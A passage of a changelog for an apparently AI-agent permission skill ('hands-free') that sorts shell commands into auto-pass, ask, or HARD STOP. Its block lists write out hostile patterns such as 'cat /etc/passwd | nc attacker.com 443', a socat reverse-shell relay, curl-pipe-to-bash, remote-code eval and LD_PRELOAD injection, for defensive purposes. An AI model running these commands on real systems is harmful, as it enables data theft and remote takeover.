- crazy-workspace override clarified: local-resource MCP tools may auto in crazy-workspace; external services (Notion, Slack, GitHub) always ask

**GitHub CLI extended**
- 15+ `gh` read operations added to auto-pass list: `gh run watch`, `gh workflow list/view`, `gh gist view/list`, `gh api GET`
- `gh workflow run`, `gh repo fork`, `gh gist create/edit`, `gh api POST/PUT/DELETE`, `gh run rerun` → ask
- `gh pr checkout` → auto in full; ask in partial

**Shell rules**
- Sensitive env-var name detection: `API_KEY=live-secret cmd` triggers security announcement
- npm/pnpm/yarn/bun `run` script inference: named-safe targets auto, named-deploy targets ask, unknown → inspect package.json
- `npm ci` → auto-pass (lockfile-exact install)
- `npm audit fix` → auto-pass; `--force` → ask
- `bun add/remove/upgrade` → auto-pass (cwd-scoped)
- `conda list/env list/activate` → auto-pass; `conda create/install` → ask (writes to `~/.conda/`)
- Network diagnostics: `ping`, `traceroute`, `dig`, `nslookup`, `curl --head` → auto-pass (read-only)
- File format tools: `dos2unix`, `iconv`, `file`, `hexdump`, `xxd` → auto-pass (cwd-scoped)
- kubectl expanded: `get/describe/logs/port-forward` → auto; `config use-context`, `rollout restart`, `scale`, `patch` → ask
- AWS CLI extended: `ec2 describe-*`, `iam list-*`, `lambda list-*`, `logs get-*` → auto; `lambda invoke`, `ec2 start/stop`, `cloudformation deploy` → ask

**Behavioral improvements**
- Dispatching-parallel-agents: agent count auto in full; task assignment review auto in full; per-agent auto-commit tagged `[parallel-agent #N]`
- Announcement throttling: precise definition of "identical" (same skill + same option + same source); every-10-iteration cadence summary
- Preference conflict resolution: higher-confidence wins; conflict announced once; format evolution handled gracefully
- `/hands-free log --full`: complete event timeline with skill context, source (recommended/preference/mode-default/user-override)
- `/hands-free check` edge cases: compound command breakdown, pipeline breakdown, shell variable explanation
- `/hands-free recommend prune`: review and remove stale low-confidence observations

**Auto-commit edge cases**
- `git commit` non-hook failure (user.email not configured) → announce and pause
- Post-commit hook failure → non-blocking; commit succeeded; announce warning
- GPG signing required → skip with announcement; never bypass `--no-gpg-sign`
- Submodule pointer changes → skip unless explicitly staged

**Troubleshooting**
- `$VAR` blocking explanation and CLAUDE.md workaround
- Pipeline blocking explanation (most restrictive component)
- MCP tool blocking: verb-prefix heuristic and CLAUDE.md override
- `npm run myscript` blocking: known-safe list and CLAUDE.md override
- `conda create/install` blocking: writes to ~/.conda; suggest uv/venv for project-isolated envs

**README**
- "What's new in 2.3" expanded with all batch 22-28 additions
- `/hands-free recommend prune` added to commands list
- `/hands-free log --full` noted in commands

### Added (iteration 11 — batch 51–60)

**Shell classification meta-rules summary (batch 51)**
- Quick-scan table of all meta-rules with pattern → classification mappings
- Rule priority ordering for meta-rules vs. tool-specific rules
- Dry-run/--check/--plan: any ask-classified command promoted to auto-pass when present (unless base is HARD STOP)
- --force/--overwrite: any auto-pass command demoted to ask when present
- --insecure/--no-verify TLS bypass: always escalates to ask regardless of base classification
- --global/--system: always escalates to ask (writes outside cwd)
- --version/--help: always auto-pass regardless of base command
- Port binding: 0.0.0.0 → ask; privileged ports <1024 → ask
- Output destination rule: if cmd auto-passes AND dest in cwd → auto; dest escapes → ask
- Config file rule: sourcing file from outside cwd → ask

**Security HARD STOP patterns (batch 51)**
- `eval "$REMOTE_SCRIPT"` where origin is unknown → HARD STOP
- `LD_PRELOAD=/path/to/lib.so cmd` → HARD STOP if lib is outside cwd (injects shared library)
- `DYLD_INSERT_LIBRARIES=...` → HARD STOP (macOS equivalent of LD_PRELOAD)
- `socat EXEC:bash,pty,...` → HARD STOP (creates reverse shell relay)
- `python -m http.server --directory /etc` → HARD STOP (exposes system paths)
- `ssh -R remote-port:localhost:local-port user@host` → ask (remote port forwarding; exposes local port externally)
- `cat /etc/passwd | nc attacker.com 443` → HARD STOP (data exfiltration pattern)
- Red flags: 8 new entries including LD_PRELOAD, eval $VAR, socat, --insecure rationalization

**Low-level build and runtime tools (batch 53)**
- C/C++: gcc/g++/clang (cwd compilation), clang-format/clang-tidy/cppcheck/cpplint → auto
- Binary inspection: addr2line, objdump, nm, strings, size → auto (read-only, cwd binary)
- LLVM: llvm-ar/nm/objdump/objcopy/llc/opt/profdata/cov → auto (cwd-scoped)
- Erlang/Rebar3: compile/eunit/ct/dialyzer/xref/release → auto; publish → ask
- escript local → auto; erl remsh to remote host → ask
- containerd/ctr: list → auto; pull/run → ask; crictl inspect/ps → auto; pull → ask
- podman machine: list/info → auto; init/start → ask (VM creation)

**gRPC, API testing, Python test envs, pip-tools, stylelint, gosec (batch 54)**
- grpcurl: localhost read RPCs → auto; write RPCs/remote → ask
- newman: collection runner → ask unless --env-var localhost; --dry-run → auto
- tox/nox: list → auto; test/lint → auto; publish env → ask
- pip-compile → auto (cwd writes); pip-sync → ask (modifies environment); --dry-run → auto
- stylelint: cwd lint/fix → auto
- gosec: cwd Go security scan → auto (read-only)
- tmux/screen/zellij: list/attach → auto; kill-session → ask
- just/task: list → auto; recipe → classify by name (same as npm run)
- vector validate/test → auto; daemon → ask; otelcol validate → auto; run → ask
- ClickHouse: localhost reads → auto; writes/remote → ask

**Framework CLIs, web servers, direnv/conda (batch 55)**
- Rails: generate → auto; db:migrate → auto; db:rollback/drop/seed/console → ask; routes → auto
- Phoenix/Elixir: phx.gen.* → auto; phx.routes → auto; ecto.create → auto; ecto.drop/reset → ask
- Django extras: shell/dbshell/flush/createsuperuser → ask; collectstatic/test/check/showmigrations/sqlmigrate → auto
- .NET CLI: build/test/run/restore/format → auto; publish/nuget push → ask; EF Core migrations covered
- nginx: -t → auto; -s reload → ask; caddy validate/run → auto; caddy reload → ask
- apache2ctl configtest → auto; graceful/restart → ask
- direnv: deny/reload/unload/status → auto; edit → ask
- conda extras: lock/export → auto; env update/remove/clean → ask

**Security audit details, Ruby testing, ML tracking, CI/CD (batch 56)**
- bandit: full rule/flag coverage → auto (cwd-scoped; all output flags)
- safety/pip-audit: scan → auto; pip-audit --fix → ask
- dependency-check OWASP → auto (cwd-scoped); semgrep local rules → auto; remote rules → ask
- Ruby testing: rspec/minitest/cucumber → auto; rubocop/standardrb → auto; rubocop -a → auto
- Jupyter: execute/nbconvert → auto; kernelspec install → ask
- DVC extras: repro/params/metrics → auto; push/pull → ask
- wandb: login/init/sync → ask; offline/status → auto
- Buildkite: start/pipeline upload → ask; meta-data get → auto
- Jenkins CLI: localhost list-jobs → auto; build → ask; remote → ask

**Version managers, k8s quality, service mesh, coverage, outdated checks (batch 57)**
- rbenv/jenv/sdkman → auto (join pyenv/nvm version manager category)
- kube-score/kubeval/kubesec/pluto/conftest/kyverno → auto (cwd-scoped k8s quality tools)
- istioctl analyze/validate → auto; install/cluster ops → ask
- linkerd install → ask
- Grafana CLI: plugins ls → auto; admin reset → ask
- coverage.py/nyc/c8/lcov/genhtml/go cover → all auto (cwd-scoped)
- npm/yarn/cargo/bundle/pip/composer/go list -u outdated → all auto (read-only)
- supervisord: status → auto; start/stop/restart/reload → ask; supervisord -c cwd → auto
- shfmt: format/diff → auto; envsubst cwd → auto

**Archive extras, modern crypto, API codegen, GraphQL, network capture (batch 58)**
- Archive: tar tf/--strip-components, unzip -l, bzip2/xz/7z → auto
- age: encrypt cwd → auto; keygen cwd → auto; decrypt → ask
- sops: encrypt → auto; decrypt/edit/rotate → ask
- openapi-generator local → auto; remote URL → ask; swagger-codegen cwd → auto
- Apollo rover: introspect localhost → auto; remote → ask; publish/check → ask
- tcpdump/tshark live → ask (sensitive data); -r read pcap → auto

**Troubleshooting entries for batches 53-58 (batch 59)**
- rebar3 publish, wandb sync, sops --decrypt, tcpdump live, rover check, istioctl install
- just recipe classification, supervisorctl, tox publish env, pip-sync
- pg_restore: all variants → ask (DB state change); pg_restore -l → auto
- mongorestore: changed from auto to ask (modifies DB state)
- SQLite .dump export → auto; < restore.sql → ask
- Redis --rdb dump → auto; bgsave → ask

**Documentation and examples (batch 60)**
- Frontmatter description updated to 500+ patterns; listed all new tool categories
- 70 new examples table entries for all tools from batches 53-59

### Added (iteration 10 — batch 41–50)

**IaC and cloud provisioning tools**
- Pulumi: `preview/stack ls/stack output` → auto; `up/destroy/refresh/import` → ask
- AWS CDK: `ls/diff/synth` → auto; `deploy/destroy/bootstrap` → ask
- Ansible: `--check/--syntax-check` → auto; `ansible-playbook <playbook>` → ask (remote SSH); `ansible-lint` → auto; `ansible-vault encrypt` → ask; `ansible-vault view` → auto

**Database migration tools**
- Flyway: `info` → auto; `migrate/baseline/repair/clean` → ask
- Liquibase: `status/history` → auto; `update/rollback/drop-all` → ask
- Knex: `migrate:status/list` → auto; `migrate:latest/rollback/seed:run` → ask
- Alembic: `current/history` → auto; `upgrade/downgrade` → ask

**SSH key management**
- `ssh-add -l/-L` → auto; `ssh-add` (add/delete) → ask (modifies agent state, outside cwd)
- `ssh-keyscan <host>` (stdout) → auto; `>> ~/.ssh/known_hosts` → ask (writes outside cwd)
- `ssh-copy-id` → ask (modifies remote `~/.ssh/authorized_keys`)
- `ssh-keygen -f ./key` (cwd output) → auto; no `-f` (defaults to `~/.ssh/`) → ask

**Go extended tools**
- `go generate ./...` → ask (runs arbitrary `//go:generate` directives)
- `go doc`, `go mod download`, `go mod verify`, `go mod graph`, `go env`, `go list ./...` → auto-pass
- `go build -o ./bin/...` → auto-pass (cwd-scoped)
- `go install <pkg>@<ver>` → ask (writes to `$GOPATH/bin` — outside cwd)

**Container alternatives**
- Podman and nerdctl: same rules as Docker equivalents (build/run/ps/inspect → auto; push/login/logout → ask)

**Security meta-rules (batches 47–49)**
- `--version/--help/-V/-h` meta-rule: always auto-pass (read-only, prints info and exits)
- Dry-run/check/plan flag detection: `--dry-run/--check/--plan/-n (rsync/make)` → auto-pass even for tools that normally ask; examples: `flyway migrate --dry-run`, `kubectl apply --dry-run=client`, `rsync -n`
- `--force/--overwrite` escalation: commands auto-passing without --force escalate to ask with --force
- `-r/--recursive` with destructive commands: escalate to ask
- Output destination rule: cmd auto-passes + dest in cwd → auto; dest escapes cwd → ask
- Config file sourcing: config in cwd → base cmd rule; config outside cwd → ask
- `--insecure/--no-verify/--skip-ssl` escalation: any TLS bypass flag → ask even if base auto-passes
- `--global/--system` escalation: writes outside cwd → always ask
- Network interface binding: localhost → auto; 0.0.0.0 → ask; privileged port (<1024) → ask

**Mobile and cross-platform tools (batch 50)**
- Dart/Flutter: pub get/upgrade/analyze/format/test → auto; pub publish → ask
- Flutter: build/run/test/analyze → auto (cwd-scoped or localhost)
- Swift/Xcode: swift build/test/run/package → auto; swiftlint/swiftformat → auto
- xcodebuild test/archive/export → auto (cwd-scoped)
- Kotlin/Android: ./gradlew build/test/lint → auto; publish → ask
- detekt/checkstyle/kotlinc → auto-pass

**Load testing tools (batch 50)**
- k6 run (localhost) → auto; k6 run (remote URL) → ask; k6 cloud → ask
- locust/ab/wrk: localhost → auto; remote target → ask
- vegeta: classify by target hosts in targets file

**Additional specialized tools (batch 46)**
- GitHub CLI codespace: list/view → auto; ssh/create/delete → ask; repo clone → auto; extension install/upgrade → ask
- pnpm dlx/yarn dlx: well-known → auto; unfamiliar → ask
- RabbitMQ: list/status → auto; purge/delete/stop → ask
- Celery: inspect/worker → auto; call/purge → ask
- Mercurial (hg): log/diff/status/add/commit → auto; push → ask; strip → ask
- git sparse-checkout/bundle: all local ops → auto
- Monitoring: promtool check/lint/localhost query → auto; remote → ask
- Sourcegraph CLI (`src`): all ops → ask (external service)

**Troubleshooting additions (batches 46–49)**
- `--dry-run` vs. base command distinction (flyway migrate example)
- gh extension install blocking (remote code to outside cwd)
- celery call blocking (message queue side effects)
- nix-env install vs nix develop (permanent profile vs session-scoped)
- --dry-run still blocked edge case (CLAUDE.md override pattern)
- hg push blocked same as git push explanation

**Shell built-ins, scheduling, network, GPG (batch 44)**
- Shell built-ins: `type/which/command -v` → auto; `source ./known` → auto, `source unknown` → ask; `exec` → classify by inner cmd
- `mapfile/readarray` (cwd file) → auto; `coproc` → classify by cmd; `declare -x` → auto
- Scheduling: `crontab -l/at -l` → auto; `crontab -e/at` → ask; `atrm` → ask
- Email: `mail/sendmail/msmtp/swaks/mutt` → always ask (sends external email)
- HTTPie (`http`/`https`): GET/download-to-cwd → auto; POST/PUT/PATCH/DELETE → ask
- rclone: ls/download-to-cwd → auto; upload/sync-to-remote/delete → ask
- s5cmd: ls/download → auto; upload → ask
- Cloudflare Workers (wrangler): dev/build/tail → auto; deploy/secrets/kv-put/login → ask
- GPG: verify/decrypt/sign/list/export → auto; recv-keys/send-keys/gen-key → ask
- wget: single-file to cwd → auto; recursive `-r` → ask
- Temporal CLI: list/describe/server start-dev → auto; execute/start/terminate/cancel → ask

**Specialized tools (batch 45)**
- Elasticsearch/OpenSearch: GET/search→auto, DELETE/PUT index→ask; elasticdump export→auto, import→ask
- Kafka CLI: `--list/--describe` → auto; `--create/--delete/producer` → ask; consumer localhost → auto
- mongosh: local read queries → auto; write/dropDatabase → ask; mongostat/mongotop/mongoexport → auto; mongoimport → ask
- Nix: `nix-shell/build/eval/flake check` → auto; `nix-env install/gc/nix run <URL>` → ask
- Bazel: `build/test/query/clean/fetch/coverage` → auto; `run` (network-using) → ask
- Zig: `build/test/fmt/cc/translate-c` → auto-pass
- Bun runtime: `bun ./script.ts/bun test/bun build` → auto; `bun x <unfamiliar>` → ask
- Neon CLI: `list/connection-string` → auto; `branches create/delete` → ask
- Turso CLI: `list/show/shell` → auto; `create/destroy/replicate` → ask

**Examples table expanded (batch 44–45)**
- 55+ new examples covering Zig, Bazel, Nix, Bun runtime, Wrangler, Stripe, Supabase, Vercel, Netlify, Fly.io, Pulumi, AWS CDK, Ansible, Flyway, HTTPie, GPG, crontab, mongosh, Kafka, Temporal

**Secrets detection expanded (batch 43)**
- Platform-specific token prefixes: `dop_v1_` (DigitalOcean), `glpat-` (GitLab), `github_pat_` (new GitHub PAT), `sk_live_/rk_live_/pk_live_` (Stripe live keys), `AIza` (Google), `ya29.` (Google OAuth), `SG.` (SendGrid)
- AWS credential prefixes expanded: `AGPA`, `AROA`, `ASIA`, `AIPA`, `ANPA`, `ANVA`, `APKA`
- JWT token detection: `eyJ` literal prefix flag in non-test code
- Additional assignment patterns: `webhook_secret=`, `encryption_key=`, `jwt_secret=`, `session_secret=`, `master_key=`
- Cloudflare and HashiCorp Vault token patterns
- False positive reduction: skip `test/`, `examples/`, `fixtures/` dirs; skip comments; skip placeholder values; skip env var references

**CLAUDE.md Override Reference section (batch 43)**
- Comprehensive syntax documentation for persistent per-project and user-global overrides
- Available persistent settings table (Default mode, Auto-commit, Learning, Review checkpoints)
- Command-level, tool-level, and pattern-level override examples
- Override precedence rules (CLAUDE.md > built-in > MCP heuristic)
- Override scope (project vs user-global CLAUDE.md)
- Override annotation pattern (document WHY overrides exist)

**SaaS service CLIs (batch 42)**
- Stripe CLI: `listen/logs tail` → auto; `trigger/events resend/login` → ask; `fixtures` → auto
- Supabase CLI: `start/stop/status/migration new/gen types --local` → auto; `db push/pull/reset/functions deploy/link` → ask
- Firebase CLI: `emulators:start` → auto; `deploy/use/login` → ask; `functions:log` → auto
- Vercel CLI: `dev/build` → auto; `deploy/link/login` → ask; `env ls` → auto; `env pull` → ask
- Netlify CLI: `dev/build/status` → auto; `deploy/link/login/env:set` → ask; `env:list` → auto
- Railway CLI: `status/list/logs` → auto; `up/run/link/login` → ask
- Fly.io (`flyctl`): `status/logs/info/proxy` → auto; `deploy/launch/scale/ssh console/secrets set` → ask

**Troubleshooting entries**
- `stripe listen` vs `stripe trigger` distinction
- `supabase db push` blocking (schema changes to remote)
- `vercel env pull` blocking (pulls live secrets to local)
- `firebase use` blocking (changes active project context)
- `railway run` blocking (injects remote secrets)
- `ansible-playbook` blocked even on localhost (external SSH execution)
- `cdk synth` vs `cdk deploy` distinction
- `pulumi preview` vs `pulumi refresh` distinction
- Flyway/Liquibase migration blocking for dev databases (CLAUDE.md override pattern)
- `ssh-keyscan` blocking (stdout-only vs `>> known_hosts`)
- `go generate` blocking (arbitrary command execution)

## [2.2.0] — 2026-03-17

### Added (iteration 5)

**Security**
- `deno run https://...` → universal HARD STOP (language-level RCE — Deno natively fetches and runs URLs)
- `perl` fetch-then-eval patterns → universal HARD STOP (added to language RCE list)
- `docker compose push` → shared/remote state hard stop (pushes to external registry)
- `terraform apply`, `terraform destroy` → shared/remote state hard stop (modifies external infrastructure)
- `ssh`, `scp`, `rsync` to remote hosts → ask (remote machine access, not within `./`)

**Secrets Detection**
- Filename patterns: `.npmrc` (npm auth tokens), `*.cer`, `*.der`, `*.crt` (certificate files)
- Content signals: `database_url=`, `signing_key=` assignment patterns
- Content signals: hardcoded `Authorization: Bearer ` and `X-Api-Key:` HTTP headers in source files

**Shell Auto-Pass**
- `git tag <name>` → always-auto-pass (local tag creation, non-destructive)
- `git commit -m "..."` (non-amend, no `-a` flag) → always-auto-pass
- `git worktree add <path>` → always-auto-pass; `git worktree remove` is NOT auto-pass
- `git submodule update --init [--recursive]` → always-auto-pass
- `git submodule add <url>` → auto-pass in full, ask in partial (execution-type)
- `docker compose up/build/down/run` → auto-pass; `docker compose push` → ask
- `bun install` → auto-pass (equivalent to npm install)
- `make test`, `make build` → auto-pass; `make install` → ask (may write to system paths)
- `pre-commit run --all-files` → auto-pass (runs hooks locally)
- `terraform plan` → auto-pass (read-only dry run)

**Rules**
- Env-var prefix rule: `KEY=value cmd` classified by underlying `cmd`, not by the env var
- Execution-type vs design-type for custom skills in partial mode: explicit classification criteria
- Remote DB example fix: `psql postgresql://prod-db/mydb -c "DROP TABLE"` → ask (not HARD STOP; consistent with remote DB rule)

**Mode Behavior Table**
- Added "Language RCE" row (separate from curl|bash pipe-to-shell row)

**Documentation**
- README FAQ: 3 new entries (docker compose push vs up, Claude Code permission system interaction, partial mode execution-type)
- Troubleshooting: `deno run` local vs URL clarification; terraform apply/destroy
- README security table updated with deno run URL

## [2.1.0] — 2026-03-17

### Added (iteration 4 — continued from 2.0.0)

**Security**
- `sudo -s`, `sudo su`, `sudo bash`, `sudo sh` (interactive root shell) → universal HARD STOP
- Global package install detection: `npm install -g`, `cargo install`, `pip install` without venv → ask (writes outside cwd)
- Docker volume mount rules: `-v ./:/app` auto-pass; `-v /:/host`, `-v ~/.ssh:/ssh` ask
- `git config --global/--system` → ask (modifies global git config)

**UX / Commands**
- `/hands-free` with no argument: activate full mode if not active; show status if already active
- `/hands-free learning` with no argument: show current level and threshold summary
- Mode persistence guidance: explains session-scoped reset; how to persist via CLAUDE.md
- Announcement format table: maps each decision source to its output format (silent, announce, hard stop)
- Version bumped to 2.1.0; frontmatter description updated to include language-level RCE and global installs

**Shell auto-pass**
- `nvm`, `rustup` added to always-auto-pass list
- `pnpm install`, `yarn install` added to always-auto-pass list
- Remote DB connection string detection: `postgresql://non-localhost` in command line → ask
- Database migration examples: `sqlx migrate run`, `alembic upgrade head`, `npx prisma migrate dev`, `diesel migration run`
- Additional examples: `pnpm run build`, `yarn test`, `python -m venv .venv`, `docker run -v ./`, `sudo -s`

**Custom skill integration**
- Implicit recommendation detection: "I recommend...", "I suggest...", "best option is..." → treated as explicit recommendation
- Custom skill's own confirmation prompts handled as standard checkpoint approvals

**Ralph Loop**
- Loop stall prevention: 3 iterations with no new progress → stall warning and mandatory pause
- Explicit note: does NOT output completion promise unless condition is genuinely true

**Auto-commit**
- Merge conflict detection blocks auto-commit when conflicts are unresolved
- `git commit --amend`, `git commit -a`, `git add -A` added to forbidden operations
- Merge conflict troubleshooting entry added

**`/hands-free explain`**
- Extended to explain hard stop decisions (not just auto-accept decisions)
- Shows matched pattern, rule tier, and safe alternative when applicable

**Review Checkpoints**
- [R] Revise option behavior clarified: prompts user to describe revision, applies it, then re-surfaces checkpoint
- [S] Stop option announces waiting state and expected resume instruction

**Shell auto-pass (continued)**
- `git checkout -b`, `git branch`, `git stash/pop`, `git log/status/diff` added to always-auto-pass list
- `python manage.py migrate`, `python manage.py makemigrations` added (Django)
- `cargo publish`, `npm publish`, `docker push`, `vercel deploy`, `zeabur deploy` added as ask (external registries/services)
- Publish/deploy commands added to shared/remote state hard stop list

**Security (continued)**
- Deployment/publish keyword detection in custom skill approvals: "deploy", "publish", "push to [service]" keywords trigger hard stop pattern recognition
- Partial git add failure: announce which files failed before attempting partial commit

**Reliability**
- `preferences.md` corruption: continue with defaults, announce once
- `/hands-free status` in off mode: shows learning level and preferences loaded count
- Optional review checkpoints silently ignored in partial mode (always on, not user-configurable)
- Single-option presentation = confirmation → auto-accept in full mode

**Superpowers integration**
- `test-driven-development` approval points added to table
- `verification-before-completion` routing documented: auto-verify → debugging on failure
- Mode switch announcements defined for all transitions (including off→full, off→partial)
- Agent tool dispatch guidance: full mode auto-approves, partial mode asks for execution-type agents

## [2.0.0] — 2026-03-17

### Added (iteration 3 — same day)

**Security**
- Language-level RCE hard stops (universal): `python -c "exec(urllib...)"`, `node -e "eval(...)"`, `ruby -e "eval(URI.open...)"`, `source <(curl ...)` blocked in ALL modes
- Updated Quick Reference and README security table to include all RCE variants and language-specific patterns

**Auto-commit**
- Merge conflict detection: skip auto-commit and announce when unresolved conflicts exist in working tree
- Added `git commit --amend` and `git commit -a` / `git add -A` to the forbidden operations list
- Updated edge cases table with merge conflict scenario

**Learning / Preferences**
- `/hands-free learning` with no argument: show current learning level and threshold summary
- Sensitivity vs. confidence clarification: explains that confidence tier = permanence in preferences.md; sensitivity = how aggressively current session applies it
- Preference pruning guidance: when and how to remove stale observations from preferences.md

**Shell examples**
- TypeScript: `npx eslint src/`, `npx vitest run`, `bun run test`, `bun run build`
- Python: `python -m mypy src/`, `python -m ruff check .`, `uv run pytest`
- Rust: `cargo fmt`, `cargo fmt --check`, `cargo sqlx prepare`
- New HARD STOP examples: `source <(curl ...)`, `python -c "exec(urllib...)"`, `node -e "eval(...)"`

**Superpowers integration**
- Added `dispatching-parallel-agents` and `requesting-code-review` to Superpowers-Specific Approval Points table

**Ralph Loop**
- Loop stall prevention: detect 3 consecutive iterations with no new progress; announce stall warning and pause for user input
- Clarified: does NOT output completion promise unless condition is genuinely true

**UX**
- Mode table note: optional review checkpoints become HARD STOP when `review-checkpoints on` is set
- `off` mode clarification: governs skill-level approval points, not Claude Code tool execution system
- Improved dry-run output: shows mode-specific state for optional checkpoints and rm-rf patterns
- Write-Capable Tool Rules section: documents Edit/Write/NotebookEdit auto-pass rules and secrets scan behavior

### Added

**Security**
- Pipe-to-shell hard stop (universal): `curl | bash`, `wget | sh`, `eval $(curl ...)`, `bash <(curl ...)` blocked in ALL modes including crazy-workspace
- Privilege escalation hard stop (universal): `chmod 777`, `chmod -R 777`, `sudo` to system paths blocked in ALL modes
- Secrets detection before every auto-commit: filename patterns (`.env`, `*.pem`, `*.key`, etc.) and content signals (`sk-`, `ghp_`, `AKIA`, `-----BEGIN RSA`, `password=`, etc.); applies in all modes including crazy-workspace; cannot be overridden
- Path traversal clarification: symlink escapes, `..`-normalized paths, `$HOME`/`~`/`$XDG_*` expansions that exit cwd now block shell auto-pass

**Automation**
- `/hands-free dry-run`: preview what would be auto-accepted without enabling hands-free or changing state
- `/hands-free pause` / `/hands-free resume`: temporarily suspend auto-accept without changing mode; paused state shown in status
- `/hands-free explain`: trace the reasoning behind the most recent auto-accept decision
- `/hands-free reset`: clear all learned preferences with confirmation prompt (always pauses, never auto-accepted)
- `/hands-free review-checkpoints on/off`: structured pause-and-summarize before costly phase transitions; two mandatory checkpoints (before execution, before push/merge)
- Iteration warnings in ralph-loop: print at 3 and 2 remaining iterations; mandatory PAUSE at 1 remaining
- Git-log-based loop state detection: concrete algorithm using `git log --oneline -20` + `git status --short`; five-state decision table replaces heuristic prose

**UX / Documentation**
- Quick Reference table at top of skill: maps user intent to commands; includes "Always blocked" reminder
- `/hands-free status`: fully defined with mode, learning, auto-commit, review checkpoints, pause state, loop-aware state, session decisions, and tiered hard stop lists
- Recommended Setup: expanded from single line to use-case table covering 5 scenarios
- Mode transitions: defined mid-session switching behavior; `partial` auto-enables review-checkpoints
- Conflict resolution: priority rules when two skills present simultaneous approval points
- Session log: added 6 new event types (`[review-checkpoint]`, `[auto-commit]`, `[verification]`, `[hard-stop]`, `[user-override]`)
- "When There Is No Recommended Option": pick learned preference, then first-listed, then log and continue
- Custom Skill Integration: documented how hands-free recognizes approval patterns in non-superpowers skills
- Preference staleness: downgrade rules when user repeatedly contradicts a learned preference
- Preferences scoping: global (not per-project); added "What NOT to record" guidance
- Auto-commit edge cases: 6 scenarios (no changes, no git repo, hook failure, secrets in staged files, git add failure, untracked-only)
- Shell examples: added `cargo build`, `make build` (auto-pass); `curl|bash`, `wget|sh`, `eval$(curl)`, `chmod 777`, `sudo /etc/` (HARD STOP)

### Fixed

- Crazy-workspace activation announcement: now lists all 5+ hard stops (was listing only `rm -rf *` and `rm -rf .git`)
- Crazy-workspace "Two absolute hard stops": updated to "Absolute hard stops (no exceptions, no override)"
- Crazy-workspace decision flowchart: updated to check pipe-to-shell, chmod 777, secrets in addition to rm -rf patterns
- HARD STOP section: restructured into two-tier (universal vs standard); git push/merge now annotated as crazy-workspace overrideable within `./`; removed duplicate "crazy-workspace too" block
- Status output: `git push` moved from flat "Active hard stops" to "Mode hard stops"; `secrets-in-commit` and `Paused:` field added
- Red flags table: clarified mode-specific vs universal stops; added "crazy-workspace allows everything" misconception row
- Command comment for `crazy-workspace`: updated from "except rm -rf * and rm -rf .git" to "5 universal hard stops remain"
- `/hands-free recommend` section: added explicit "will NEVER suggest" rule for universal hard stops
- Frontmatter description: updated to reflect all current capabilities (was stale, mentioned only 3 modes)

### Changed

- Mode behavior table: added `curl | bash`, `chmod 777`, secrets, and review checkpoint rows (19 rows total, up from 10)
- Auto-commit safety rules: expanded from single bullet to full secrets detection procedure with filename/content patterns
- Shell auto-pass rules: added symlink escapes, normalized `..` paths, `$HOME`/`~`/`$XDG_*` as path-escape conditions
- README mode table: expanded from 5 rows to 13 rows; added crazy-workspace column; includes all new hard stop patterns
- README commands section: all 16 commands documented including dry-run, pause/resume, explain, reset, review-checkpoints
- README "What it does": added pipe-to-shell/secrets blocking and review checkpoints; updated "Three modes" to "Four modes"

### Added (continued, same day — iteration 2)

- Read-only tool auto-pass: Grep, Glob, Read, WebFetch/WebSearch explicitly documented as always auto-approved (read-only, no side effects); mode table row updated from "Grep tool calls" to "Read-only tools"
- CLAUDE.md integration: per-project preference overrides via CLAUDE.md `# hands-free overrides` section; takes precedence over global preferences.md
- FAQ section in README: 6 common questions (custom skill compatibility, safety, preference updates, crazy-workspace on shared repos, sensitive data, disabling learning)
- Shadow mode: `/hands-free off` + `learning high` added to Recommended Setup table
- Auto-commit: step 2 now explicitly reads `git log --oneline -5` to detect commit message style
- Crazy-workspace production warning: blockquote warning not to use on production repos
- Comprehensive decision flowchart: updated digraph in HARD STOP section to show full path through universal hard stops → paused/off → review checkpoint → learned preference → mode allows
- Session log: documented as in-memory only (not persisted), with pointer to git log and preferences.md for durability
- Loop state algorithm: fallback documented when user commits without auto-commit (no `[ralph #N]` tags)
- `What's new in 2.0` section in README

### Fixed (same day — iteration 2)

- `rm -rf *`: README mode table showed HARD STOP in all modes — corrected to `ask` in full/partial/off (user is prompted, not blocked); HARD STOP only in crazy-workspace
- `git push`: README mode table showed HARD STOP in full/partial/off — corrected to `ask` (user can confirm); semantics: `ask` = pause+confirm, HARD STOP = blocked
- Shared/remote state: incorrectly annotated as crazy-workspace overrideable — external services (GitHub API, Slack) are not within `./` so crazy-workspace does not override
- Crazy-workspace behavior description: "CI changes" → "CI/CD workflow file edits" to distinguish local file edits (auto-approved) from triggering external deployments (hard stop)
- Quick Reference table: `/hands-free log` and `/hands-free recommend` were missing
- Recording format: `## Learned Rules` split into high/medium sections to match preferences.md structure

### Added (continued, later in same day)  (original list)

- `version: 2.0.0` in frontmatter
- Troubleshooting section: 5 scenarios (not auto-accepting, blocking unexpectedly, preferences not applying, auto-commit unexpected files, loop exhausted)
- `/hands-free recommend`: expanded output with override stats, auto-commit suggestion, review-checkpoint trigger; smart suggestion thresholds; `/hands-free recommend promote <action>` subcommand
- `/hands-free explain`: trace the reasoning behind any auto-accept decision
- `/hands-free pause` / `/hands-free resume`: temporarily suspend without changing mode
- `/hands-free reset`: clear all learned preferences with confirmation
- Session Log: persist note (in-memory only); all 10 event types listed
- Mode transitions: defined mid-session switching; `partial` auto-enables review-checkpoints
- Conflict resolution: priority rules for competing skill approval points
- "When There Is No Recommended Option": fall back to preference → first-listed → log
- Custom Skill Integration: recognition patterns for non-superpowers skills
- Preferences scoping, staleness, and "What NOT to record" rules
- Ralph loop state file edge cases (missing file, null max_iterations, malformed YAML)
- Iteration-aware commit fallback when `[ralph #N]` tags absent
- Iteration warnings (print at 3/2 remaining, PAUSE at 1 remaining)
- Loop state algorithm fallback note when user commits without auto-commit
- Auto-commit edge cases: 6 scenarios
- Shell examples: `cargo build`/`make build`/`curl -o ./tool` (auto-pass); `curl|bash`/`chmod 777`/`sudo /etc/` (HARD STOP)
- Quick Reference table at top of skill

## [1.0.0] — 2026-03-16

### Changed

- **crazy-workspace mode**: Simplified behavior description — auto-approve all operations within `./` without the redundant qualifier. Hard stops remain: `rm -rf *` and `rm -rf .git`.
